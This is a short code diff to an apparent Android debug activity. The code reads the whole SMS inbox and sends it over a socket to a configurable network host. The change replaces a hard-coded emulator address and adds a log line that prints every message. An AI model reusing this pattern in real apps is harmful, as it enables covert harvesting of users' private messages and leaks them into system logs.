@@ -6,6 +6,7 @@ import transport.SendTask;
 import transport.SockReceiveThread;
 import android.app.Activity;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.Menu;
 import android.widget.TextView;
 
@@ -28,9 +29,7 @@ public class DebugActivity extends Activity {
         SMSMessage messages[] = (new SMSReader(this)).getInboxMessages();
 
         String toSend = Packetizer.packetize(messages);
- 
-        NetInfo.setIp("10.0.2.2");
-
+        Log.i("DebugActivity", "Sending Inbox" + toSend);
         (new SendTask()).execute(toSend
         		,NetInfo.getIp()
         		,String.valueOf(NetInfo.getPort()));    
